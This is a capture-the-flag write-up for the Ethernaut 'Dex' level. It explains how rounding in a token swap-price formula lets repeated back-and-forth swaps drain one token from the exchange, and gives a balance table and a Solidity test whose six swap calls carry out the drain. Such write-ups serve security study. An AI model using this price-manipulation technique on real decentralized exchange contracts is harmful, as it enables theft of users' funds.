# Level 22 - Dex

## Objectives

- Drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

## Contract Overview

`Dex` is a contract or decentralized exchange platform that deals with token swapping and exchange. The Dex contract has a balance of 100 tokens each.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Dex_slither.png)

## Finding the weak spots

The weak spot of the contract is function `getSwapPrice()` that is prone to rounding error and price manipulation attack.

```solidity
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

This function is taking addresses for both the tokens and the amount of from tokens to be swapped and calculates the amount of to tokens. The following formula is used:
`The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.`

This is the vulnerable function. We will be exploiting the fact that there are no floating points in solidity which means whenever the function will do a division, the result will be a fraction. Since there are no decimals and floating points, the token amount will be rounded off towards zero. Therefore, by making continuous token swaps from token1 to token2 and back, we can decrease the total balance of one of the tokens in the contract to zero. The precision loss will automatically do the job for us.

## Potential attack scenario (hypothesis)

Attacker has to swap all token1 for token2. Then swap all token2 for token1. And repeat this process until he drains all token1.

## Plan of the attack and calculations

1. Initially Dex has a balance of 100 for both the tokens and the attacker has a balance of 10 each.
2. The attacker makes a token swap from token1 to token2 for 10 tokens. Dex will have 110 token1 and 90 token2 whereas the user will have 0 token1 and 20 token2.
3. Now, when the user swaps 20 token2 for token1, the formula will return the following:
   `Number of token1 tokens returned = (20 * 110)/90 = 24.44`
   This value will be rounded off to 24. This means Dex will now have 86 token1, and 110 token2 and attacker will have 24 token1 and 0 token2.
4. On each token swap, we are left with more tokens than held previously.
5. Once reached a value of 65 tokens for either token1 or token2, attacker can do another swap to drain the balance of one of the tokens from Dex. `((65\*110)/45 = 158)`

| Dex | User
|token1 | token2 | token1 | token2
|100 | 100 | 10 | 10
|110 | 90 | 0 | 20
|86 | 110 | 24 | 0
|110 | 80 | 0 | 30
|69 | 110 | 41 | 0
|110 | 45 | 0 | 65
|0 | 90 | 110 | 20

This means that in the final step if attacker needs to drain 110 token1, the amount of token2 to be swapped is `(65 * 110)/158 = 45`. This will bring the token1 balance of the Dex to 0.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/22-Dex.t.sol))

```solidity
    // Approve the dex to manage all of our token
        token1.approve(address(level), 2 ** 256 - 1);
        token2.approve(address(level), 2 ** 256 - 1);

        emit log_named_uint(
            "Token1 balance of Dex before attack is",
            level.balanceOf(address(token1), address(level))
        );

        emit log_named_uint(
            "Token2 balance of Dex before attack is",
            level.balanceOf(address(token2), address(level))
        );

        level.swap(address(token1), address(token2), 10);
        level.swap(address(token2), address(token1), 20);
        level.swap(address(token1), address(token2), 24);
        level.swap(address(token2), address(token1), 30);
        level.swap(address(token1), address(token2), 41);
        level.swap(address(token2), address(token1), 45);

        assertEq(
            token1.balanceOf(address(level)) == 0 ||
                token2.balanceOf(address(level)) == 0,
            true
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_uint(
            "Token1 balance of Dex after attack is",
            level.balanceOf(address(token1), address(level))
        );

        emit log_named_uint(
            "Token2 balance of Dex after attack is",
            level.balanceOf(address(token2), address(level))
        );
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Dex.png)

## Recommendations

When doing calculations related to any sensitive asset such as tokens, careful attention should be paid to precision since there are no floating points in solidity, precision is lost as numbers are rounded off leading to exploits.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)
- [Blog cmichel](https://cmichel.io/ethernaut-solutions/)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
